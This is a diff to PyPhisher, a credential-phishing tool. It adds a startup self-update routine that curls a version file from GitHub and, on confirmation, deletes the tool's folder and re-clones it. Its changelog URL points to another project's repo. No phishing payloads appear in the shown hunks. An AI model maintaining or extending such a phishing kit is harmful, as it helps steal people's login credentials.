@@ -1,6 +1,6 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhisher
-# Version : 1.0
+# Version : 1.3
 # Author  : KasRoudra
 # Github  : https://github.com/KasRoudra
 # Contact : https://m.me/KasRoudra
@@ -101,6 +101,8 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
+version="1.3"
+
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
 error = blue + '[' + white + '!' + blue + '] '+red
@@ -141,10 +143,6 @@ if system("command -v dnf > /dev/null 2>&1")==0:
     dnf=True
 else:
     dnf=False
-if system("command -v pacman > /dev/null 2>&1")==0:
-    pacman=True
-else:
-    pacman=False
 if system("command -v brew > /dev/null 2>&1")==0:
     brew=True
 else:
@@ -165,7 +163,7 @@ logo='''
 '''+blue+''' |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 '''+red+''' | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 '''+yellow+''' |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-'''+green+'''         __/ |                                   
+'''+green+'''         __/ |                          '''+cyan+'''[v1.3]
 '''+cyan+'''        |___/                   '''+red+'''[By KasRoudra]
 '''
 
@@ -227,6 +225,29 @@ def reporthook(blocknum, blocksize, totalsize):
     else:
         sys.stderr.write("read %d\n" % (readsofar,))
 
+# Update of PyPhisher
+def update():
+    internet()
+    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
+    if (version != git_ver and git_ver != "404: Not Found"):
+        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log").read()
+        system("clear")
+        print(logo)
+        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
+        upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
+        if upask=="y":
+            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
+            sprint("\n"+success+"PyPhisher updated successfully!!\n")
+            if (changelog != "404: Not Found"):
+                print(info2+"Changelog:\n"+green+changelog)
+            exit()
+        elif upask=="n":
+            print("\n"+info+"Updating cancelled. Using old version!")
+            sleep(2)
+        else:
+            print("\n"+error+"Wrong input!\n")
+            sleep(2)
+
 # Print logo
 def slowprint(n):
     for word in n + '\n':
@@ -278,7 +299,7 @@ def about():
     system("clear")
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
-    print(red+'[Version]   '+cyan+' :[1.0]')
+    print(red+'[Version]   '+cyan+' :[1.3]')
     print(red+'[Author]    '+cyan+' :[KasRoudra] ')
     print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
     print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
@@ -844,6 +865,7 @@ def waiter():
 
 if __name__ == '__main__':
     try:
+        update()
         main()
     except KeyboardInterrupt:
         killer()
